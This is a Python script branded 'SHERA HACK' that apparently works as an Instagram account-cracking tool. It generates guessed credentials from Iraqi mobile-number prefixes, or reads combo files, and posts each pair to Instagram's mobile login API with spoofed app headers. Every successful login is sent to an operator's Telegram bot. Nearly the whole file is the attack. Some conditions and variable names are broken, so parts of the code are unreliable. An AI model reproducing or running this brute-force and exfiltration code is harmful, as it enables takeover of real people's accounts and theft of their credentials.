import random, time, user_agent
import os
import sys
from bs4 import BeautifulSoup
import json
from uuid import uuid4
import requests

def shera(): 
  uuid = str(os.geteuid()) + str(os.getlogin()) 
  id = "-".join(uuid) 
  print("\x1b[37;1mID : "+id) 
  try: 
    link = requests.get("https://github.com/shwansorany80/SheraxHACKE0/blob/main/id.txt").text 
    if id in link: 
      print("\033[92mYOUR ID IS ACTIVE!.....") 
      msg = str(os.geteuid()) 
      time.sleep(0.3) 
      pass 
    else: 
      print("\x1b[91mIDT ACTIVE NIA LA TELEGRAM NAMA BNERA....") 
      time.sleep(1) 
      sys.exit() 
  except: 
    sys.exit() 
    if name == '__main__': 
     print(logo) 
     shera() 
shera()

#---------------
hits = 0
bad = 0
error = 0
checkpoint = 0
tottal = 0
count = 0
count2 = 0
tested = 0
#---------------

logo = """
\033[32m
  ██████     ██░ ██    ▓█████     ██▀███      ▄▄▄      
▒██    ▒    ▓██░ ██▒   ▓█   ▀    ▓██ ▒ ██▒   ▒████▄    
░ ▓██▄      ▒██▀▀██░   ▒███      ▓██ ░▄█ ▒   ▒██  ▀█▄  
  ▒   ██▒   ░▓█ ░██    ▒▓█  ▄    ▒██▀▀█▄     ░██▄▄▄▄██ 
▒██████▒▒   ░▓█▒░██▓   ░▒████▒   ░██▓ ▒██▒    ▓█   ▓██▒
▒ ▒▓▒ ▒ ░    ▒ ░░▒░▒   ░░ ▒░ ░   ░ ▒▓ ░▒▓░    ▒▒   ▓▒█░
░ ░▒  ░ ░    ▒ ░▒░ ░    ░ ░  ░     ░▒ ░ ▒░     ▒   ▒▒ ░
░  ░  ░      ░  ░░ ░      ░        ░░   ░      ░   ▒   
      ░      ░  ░  ░      ░  ░      ░              ░  ░
\033[0;1m------------------------------------------------------
\033[32mAUTHOR: SHERA HACK
\033[32mTELEGRAM: @sH1Xe
\033[32mNOTE: TOOL VIP WITH ID ACTIVE
\033[0;1m------------------------------------------------------
"""
print(logo)
ID=input("\n\033[96;1mID TELEGRAM: ")
os.system('clear')
print(logo)
token=input("\n\033[36;1mTOKEN BOT: ")
os.system('clear')

print(logo)
shera = input("""\033[32m{ 1 } HACK INSTAGRAM { RANDOM-VIP }

\033[32m{ 2 } HACK INSTAGRAM { COMBO }

\033[32m{ 3 } HACK INSTAGRAM { RANDOM }

\033[32m{ 4 } HACK INSTAGRAM { RANDOM }

\033[32m{ 5 } HACK INSTAGRAM { RANDOM }
\033[0;1m------------------------------------------------------\n
\033[36;1mCHOOSE ONE: """)

if shera=="1":
		os.system("rm -rf combo.txt")
		os.system('clear')
		for i in range(10000):
				out=random.randint(1000000, 9999999)
				sks=("+964750"+str(out)+":"+str(out))
				with open("combo.txt", "a") as m:
					m.write(str(sks)+"\n")
				tm=random.randint(1000000, 9999999)
				ss=("+964750"+str(tm)+":"+str(tm))
				with open("combo.txt", "a") as bo:
					bo.write(str(ss)+"\n")
				yo=random.randint(1000000, 9999999)
				sos=("+964750"+str(yo)+":"+str(yo))
				with open("combo.txt", "a") as bo:
					bo.write(str(sos)+"\n")
				nk=random.randint(1000000, 9999999)
				sks=("+964750"+str(nk)+":"+str(nk))
				with open("combo.txt", "a") as bo:
					bo.write(str(sks)+"\n")
				kl=random.randint(1000000, 9999999)
				ssl=("+964750"+str(kl)+":"+str(kl))
				with open("combo.txt", "a") as bo:
					bo.write(str(ssl)+"\n")
				uo=random.randint(1000000, 9999999)
				po=("+964750"+str(uo)+":"+str(uo))
				with open("combo.txt", "a") as bo:
					bo.write(str(po)+"\n")
				uK=random.randint(1000000, 9999999)
				KO=("+964750"+str(uK)+":"+str(uK))
				with open("combo.txt", "a") as bo:
					bo.write(str(KO)+"\n")
				oi=random.randint(1000000, 9999999)
				oe=("+964750"+str(oi)+":"+str(oi))
				with open("combo.txt", "a") as bo:
					bo.write(str(oe)+"\n")
				qn=random.randint(1000000, 9999999)
				qe=("+964750"+str(qn)+":"+str(qn))
				with open("combo.txt", "a") as bo:
					bo.write(str(qe)+"\n")
		ker="combo.txt"
		file=open(ker,"r").read().splitlines()
		for jrt in file:
			user=jrt.split(':')[0]
			pasw=jrt.split(':')[1]
			req = requests.session()
			url = 'https://i.instagram.com/api/v1/accounts/login/'
			headers = {'User-Agent':'Instagram 113.0.0.39.122 Android (24/5.0; 515dpi; 1440x2416; huawei/google; Nexus 6P; angler; angler; en_US)', 
             'Accept':'*/*', 
             'Cookie':'missing', 
             'Accept-Encoding':'gzip, deflate', 
             'Accept-Language':'en-US', 
             'X-IG-Capabilities':'3brTvw==', 
             'X-IG-Connection-Type':'WIFI', 
             'Content-Type':'application/x-www-form-urlencoded; charset=UTF-8', 
             'Host':'i.instagram.com'}
			uid = str(uuid4())
			data = {'uuid':uid, 
             'password':pasw, 
             'username':user, 
             'device_id':uid, 
             'from_reg':'false', 
             '_csrftoken':'missing', 
             'login_attempt_countn':'0'}
			r = req.post(url, headers=headers, data=data, allow_redirects=True)
			if "logged_in_user" in r.text:
					os.system('clear')
					print(logo)
					hits+=1
					tested+=1
					print(f'\033[0;1m[\033[1;91m~\033[0;1m] \033[0;1mTESTED\033[0;1m: \033[1;91m{tested}\n\033[0;1m[\033[32m+\033[0;1m] \033[32mHIT\033[0;1m: \033[32m{hits}\n\033[0;1m[\033[1;91m-\033[0;1m] \033[1;91mBAD\033[0;1m: \033[1;91m{bad}\n\033[0;1m[\033[1;91m-\033[0;1m] \033[1;91mERROR\033[0;1m: \033[1;91m{error}\n\033[34m------------------------------------------------------\n',end='')
					yes = (f""" 
NEW INSTAGRAM
- - - - - - - - - - - -
🅴🅼🅰🅸🅻: {user}
🅟🅐🅢🅢: {pasw}
- - - - - - - - - - - -
TELEGRAM: @sH1Xe
""")
					t = requests.post(f"https://api.telegram.org/bot{token}/sendMessage?chat_id={ID}&text={yes}")
			elif 'check your username' or 'The password you entered is incorrect.' in log.text:
					os.system('clear')
					print(logo)
					bad+=1
					tested+=1
					print(f'\033[0;1m[\033[1;91m~\033[0;1m] \033[0;1mTESTED\033[0;1m: \033[1;91m{tested}\n\033[0;1m[\033[32m+\033[0;1m] \033[32mHIT\033[0;1m: \033[32m{hits}\n\033[0;1m[\033[1;91m-\033[0;1m] \033[1;91mBAD\033[0;1m: \033[1;91m{bad}\n\033[0;1m[\033[1;91m-\033[0;1m] \033[1;91mERROR\033[0;1m: \033[1;91m{error}\n\033[34m------------------------------------------------------\n',end='')
			else:
					os.system('clear')
					print(logo)
					error+=1
					tested+=1
					print(f'\033[0;1m[\033[1;91m~\033[0;1m] \033[0;1mTESTED\033[0;1m: \033[1;91m{tested}\n\033[0;1m[\033[32m+\033[0;1m] \033[32mHIT\033[0;1m: \033[32m{hits}\n\033[0;1m[\033[1;91m-\033[0;1m] \033[1;91mBAD\033[0;1m: \033[1;91m{bad}\n\033[0;1m[\033[1;91m-\033[0;1m] \033[1;91mERROR\033[0;1m: \033[1;91m{error}\n\033[34m------------------------------------------------------\n',end='')

#----------------------

if shera=="2":
		os.system('clear')
		print(logo)
		c0mbo=input('COMBO FILE: ')
		file=open(c0mbo,"r").read().splitlines()
		for jrt in file:
			user=jrt.split(':')[0]
			pasw=jrt.split(':')[1]
			req = requests.session()
			url = 'https://i.instagram.com/api/v1/accounts/login/'
			headers = {'User-Agent':'Instagram 113.0.0.39.122 Android (24/5.0; 515dpi; 1440x2416; huawei/google; Nexus 6P; angler; angler; en_US)', 
             'Accept':'*/*', 
             'Cookie':'missing', 
             'Accept-Encoding':'gzip, deflate', 
             'Accept-Language':'en-US', 
             'X-IG-Capabilities':'3brTvw==', 
             'X-IG-Connection-Type':'WIFI', 
             'Content-Type':'application/x-www-form-urlencoded; charset=UTF-8', 
             'Host':'i.instagram.com'}
			uid = str(uuid4())
			data = {'uuid':uid, 
             'password':pasw, 
             'username':user, 
             'device_id':uid, 
             'from_reg':'false', 
             '_csrftoken':'missing', 
             'login_attempt_countn':'0'}
			r = req.post(url, headers=headers, data=data, allow_redirects=True)
			if "logged_in_user" in r.text:
					os.system('clear')
					print(logo)
					hits+=1
					tested+=1
					print(f'\033[0;1m[\033[1;91m~\033[0;1m] \033[0;1mTESTED\033[0;1m: \033[1;91m{tested}\n\033[0;1m[\033[32m+\033[0;1m] \033[32mHIT\033[0;1m: \033[32m{hits}\n\033[0;1m[\033[1;91m-\033[0;1m] \033[1;91mBAD\033[0;1m: \033[1;91m{bad}\n\033[0;1m[\033[1;91m-\033[0;1m] \033[1;91mERROR\033[0;1m: \033[1;91m{error}\n\033[34m------------------------------------------------------\n',end='')
					yes = (f""" 
NEW INSTAGRAM
- - - - - - - - - - - -
🅴🅼🅰🅸🅻: {user}
🅟🅐🅢🅢: {pasw}
- - - - - - - - - - - -
TELEGRAM: @sH1Xe
""")
					t = requests.post(f"https://api.telegram.org/bot{token}/sendMessage?chat_id={ID}&text={yes}")
			elif 'check your username' or 'The password you entered is incorrect.' or "unusable_password" in t.text:
					os.system('clear')
					print(logo)
					bad+=1
					tested+=1
					print(f'\033[0;1m[\033[1;91m~\033[0;1m] \033[0;1mTESTED\033[0;1m: \033[1;91m{tested}\n\033[0;1m[\033[32m+\033[0;1m] \033[32mHIT\033[0;1m: \033[32m{hits}\n\033[0;1m[\033[1;91m-\033[0;1m] \033[1;91mBAD\033[0;1m: \033[1;91m{bad}\n\033[0;1m[\033[1;91m-\033[0;1m] \033[1;91mERROR\033[0;1m: \033[1;91m{error}\n\033[34m------------------------------------------------------\n',end='')
			else:
					os.system('clear')
					print(logo)
					error+=1
					tested+=1
					print(f'\033[0;1m[\033[1;91m~\033[0;1m] \033[0;1mTESTED\033[0;1m: \033[1;91m{tested}\n\033[0;1m[\033[32m+\033[0;1m] \033[32mHIT\033[0;1m: \033[32m{hits}\n\033[0;1m[\033[1;91m-\033[0;1m] \033[1;91mBAD\033[0;1m: \033[1;91m{bad}\n\033[0;1m[\033[1;91m-\033[0;1m] \033[1;91mERROR\033[0;1m: \033[1;91m{error}\n\033[34m------------------------------------------------------\n',end='')

#-----------------------------
if shera=="3":
	nmuna = '9870667813825546123'
	while True:
			ker = str(''.join((random.choice(nmuna) for i in range(7))))
			user = '+964750' + ker
			pasw = ker
			tottal+=1
			req = requests.session()
			log_head = {
        'User-Agent': 'Instagram 113.0.0.39.122 Android (24/5.0; 515dpi; 1440x2416; huawei/google; Nexus 6P; angler; angler; en_US)',
        'Accept': "*/*",
        'Cookie': 'missing',
        'Accept-Encoding': 'gzip, deflate',
        'Accept-Language': 'en-US',
        'X-IG-Capabilities': '3brTvw==',
        'X-IG-Connection-Type': 'WIFI',
        'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
        'Host': 'i.instagram.com'}
			uid = str(uuid4())
			log_data = {
            'uuid': uid,
            'password': pasw,
            'username': user,
            'device_id': uid,
            'from_reg': 'false',
            '_csrftoken': 'missing',
            'login_attempt_countn': '0'}
			r = req.post('https://i.instagram.com/api/v1/accounts/login/', headers=log_head, data=log_data, allow_redirects=True)
			if "logged_in_user" in r.text:
					os.system('clear')
					print(logo)
					hits+=1
					tested+=1
					print(f'\033[0;1m[\033[1;91m~\033[0;1m] \033[0;1mTESTED\033[0;1m: \033[1;91m{tested}\n\033[0;1m[\033[32m+\033[0;1m] \033[32mHIT\033[0;1m: \033[32m{hits}\n\033[0;1m[\033[1;91m-\033[0;1m] \033[1;91mBAD\033[0;1m: \033[1;91m{bad}\n\033[0;1m[\033[1;91m-\033[0;1m] \033[1;91mERROR\033[0;1m: \033[1;91m{error}\n\033[34m------------------------------------------------------\n',end='')
					yes = (f""" 
NEW INSTAGRAM
- - - - - - - - - - - -
🅴🅼🅰🅸🅻: {user}
🅟🅐🅢🅢: {pasw}
- - - - - - - - - - - -
TELEGRAM: @sH1Xe
""")
					t = requests.post(f"https://api.telegram.org/bot{token}/sendMessage?chat_id={ID}&text={yes}")
			elif 'check your username' or 'The password you entered is incorrect.' or "unusable_password" in t.text:
					os.system('clear')
					print(logo)
					bad+=1
					tested+=1
					print(f'\033[0;1m[\033[1;91m~\033[0;1m] \033[0;1mTESTED\033[0;1m: \033[1;91m{tested}\n\033[0;1m[\033[32m+\033[0;1m] \033[32mHIT\033[0;1m: \033[32m{hits}\n\033[0;1m[\033[1;91m-\033[0;1m] \033[1;91mBAD\033[0;1m: \033[1;91m{bad}\n\033[0;1m[\033[1;91m-\033[0;1m] \033[1;91mERROR\033[0;1m: \033[1;91m{error}\n\033[34m------------------------------------------------------\n',end='')
			else:
					os.system('clear')
					print(logo)
					error+=1
					tested+=1
					print(f'\033[0;1m[\033[1;91m~\033[0;1m] \033[0;1mTESTED\033[0;1m: \033[1;91m{tested}\n\033[0;1m[\033[32m+\033[0;1m] \033[32mHIT\033[0;1m: \033[32m{hits}\n\033[0;1m[\033[1;91m-\033[0;1m] \033[1;91mBAD\033[0;1m: \033[1;91m{bad}\n\033[0;1m[\033[1;91m-\033[0;1m] \033[1;91mERROR\033[0;1m: \033[1;91m{error}\n\033[34m------------------------------------------------------\n',end='')
if shera=="4":
	nmuna = '9870667813825546123'
	while True:
			ker = str(''.join((random.choice(nmuna) for i in range(7))))
			user = '+964770' + ker
			pasw = '0770' + ker
			tottal+=1
			req = requests.session()
			log_head = {
        'User-Agent': 'Instagram 113.0.0.39.122 Android (24/5.0; 515dpi; 1440x2416; huawei/google; Nexus 6P; angler; angler; en_US)',
        'Accept': "*/*",
        'Cookie': 'missing',
        'Accept-Encoding': 'gzip, deflate',
        'Accept-Language': 'en-US',
        'X-IG-Capabilities': '3brTvw==',
        'X-IG-Connection-Type': 'WIFI',
        'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
        'Host': 'i.instagram.com'}
			uid = str(uuid4())
			log_data = {
            'uuid': uid,
            'password': pasw,
            'username': user,
            'device_id': uid,
            'from_reg': 'false',
            '_csrftoken': 'missing',
            'login_attempt_countn': '0'}
			r = req.post('https://i.instagram.com/api/v1/accounts/login/', headers=log_head, data=log_data, allow_redirects=True)
			if "logged_in_user" in r.text:
					os.system('clear')
					print(logo)
					hits+=1
					tested+=1
					print(f'\033[0;1m[\033[1;91m~\033[0;1m] \033[0;1mTESTED\033[0;1m: \033[1;91m{tested}\n\033[0;1m[\033[32m+\033[0;1m] \033[32mHIT\033[0;1m: \033[32m{hits}\n\033[0;1m[\033[1;91m-\033[0;1m] \033[1;91mBAD\033[0;1m: \033[1;91m{bad}\n\033[0;1m[\033[1;91m-\033[0;1m] \033[1;91mERROR\033[0;1m: \033[1;91m{error}\n\033[34m------------------------------------------------------\n',end='')
					yes = (f""" 
NEW INSTAGRAM
- - - - - - - - - - - -
🅴🅼🅰🅸🅻: {user}
🅟🅐🅢🅢: {pasw}
- - - - - - - - - - - -
TELEGRAM: @sH1Xe
""")
					t = requests.post(f"https://api.telegram.org/bot{token}/sendMessage?chat_id={ID}&text={yes}")
			elif 'check your username' or 'The password you entered is incorrect.' or "unusable_password" in t.text:
					os.system('clear')
					print(logo)
					bad+=1
					tested+=1
					print(f'\033[0;1m[\033[1;91m~\033[0;1m] \033[0;1mTESTED\033[0;1m: \033[1;91m{tested}\n\033[0;1m[\033[32m+\033[0;1m] \033[32mHIT\033[0;1m: \033[32m{hits}\n\033[0;1m[\033[1;91m-\033[0;1m] \033[1;91mBAD\033[0;1m: \033[1;91m{bad}\n\033[0;1m[\033[1;91m-\033[0;1m] \033[1;91mERROR\033[0;1m: \033[1;91m{error}\n\033[34m------------------------------------------------------\n',end='')
			else:
					os.system('clear')
					print(logo)
					error+=1
					tested+=1
					print(f'\033[0;1m[\033[1;91m~\033[0;1m] \033[0;1mTESTED\033[0;1m: \033[1;91m{tested}\n\033[0;1m[\033[32m+\033[0;1m] \033[32mHIT\033[0;1m: \033[32m{hits}\n\033[0;1m[\033[1;91m-\033[0;1m] \033[1;91mBAD\033[0;1m: \033[1;91m{bad}\n\033[0;1m[\033[1;91m-\033[0;1m] \033[1;91mERROR\033[0;1m: \033[1;91m{error}\n\033[34m------------------------------------------------------\n',end='')
if shera=="5":
	nmuna = '9870667813825546123'
	while True:
			ker = str(''.join((random.choice(nmuna) for i in range(7))))
			user = '+964780' + ker
			pasw = '0780' + ker
			tottal+=1
			req = requests.session()
			log_head = {
        'User-Agent': 'Instagram 113.0.0.39.122 Android (24/5.0; 515dpi; 1440x2416; huawei/google; Nexus 6P; angler; angler; en_US)',
        'Accept': "*/*",
        'Cookie': 'missing',
        'Accept-Encoding': 'gzip, deflate',
        'Accept-Language': 'en-US',
        'X-IG-Capabilities': '3brTvw==',
        'X-IG-Connection-Type': 'WIFI',
        'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
        'Host': 'i.instagram.com'}
			uid = str(uuid4())
			log_data = {
            'uuid': uid,
            'password': pasw,
            'username': user,
            'device_id': uid,
            'from_reg': 'false',
            '_csrftoken': 'missing',
            'login_attempt_countn': '0'}
			r = req.post('https://i.instagram.com/api/v1/accounts/login/', headers=log_head, data=log_data, allow_redirects=True)
			if "logged_in_user" in r.text:
					os.system('clear')
					print(logo)
					hits+=1
					tested+=1
					print(f'\033[0;1m[\033[1;91m~\033[0;1m] \033[0;1mTESTED\033[0;1m: \033[1;91m{tested}\n\033[0;1m[\033[32m+\033[0;1m] \033[32mHIT\033[0;1m: \033[32m{hits}\n\033[0;1m[\033[1;91m-\033[0;1m] \033[1;91mBAD\033[0;1m: \033[1;91m{bad}\n\033[0;1m[\033[1;91m-\033[0;1m] \033[1;91mERROR\033[0;1m: \033[1;91m{error}\n\033[34m------------------------------------------------------\n',end='')
					yes = (f""" 
NEW INSTAGRAM
- - - - - - - - - - - -
🅴🅼🅰🅸🅻: {user}
🅟🅐🅢🅢: {pasw}
- - - - - - - - - - - -
TELEGRAM: @sH1Xe
""")
					t = requests.post(f"https://api.telegram.org/bot{token}/sendMessage?chat_id={ID}&text={yes}")
			elif 'check your username' or 'The password you entered is incorrect.' or "unusable_password" in t.text:
					os.system('clear')
					print(logo)
					bad+=1
					tested+=1
					print(f'\033[0;1m[\033[1;91m~\033[0;1m] \033[0;1mTESTED\033[0;1m: \033[1;91m{tested}\n\033[0;1m[\033[32m+\033[0;1m] \033[32mHIT\033[0;1m: \033[32m{hits}\n\033[0;1m[\033[1;91m-\033[0;1m] \033[1;91mBAD\033[0;1m: \033[1;91m{bad}\n\033[0;1m[\033[1;91m-\033[0;1m] \033[1;91mERROR\033[0;1m: \033[1;91m{error}\n\033[34m------------------------------------------------------\n',end='')
			else:
					os.system('clear')
					print(logo)
					error+=1
					tested+=1
					print(f'\033[0;1m[\033[1;91m~\033[0;1m] \033[0;1mTESTED\033[0;1m: \033[1;91m{tested}\n\033[0;1m[\033[32m+\033[0;1m] \033[32mHIT\033[0;1m: \033[32m{hits}\n\033[0;1m[\033[1;91m-\033[0;1m] \033[1;91mBAD\033[0;1m: \033[1;91m{bad}\n\033[0;1m[\033[1;91m-\033[0;1m] \033[1;91mERROR\033[0;1m: \033[1;91m{error}\n\033[34m------------------------------------------------------\n',end='')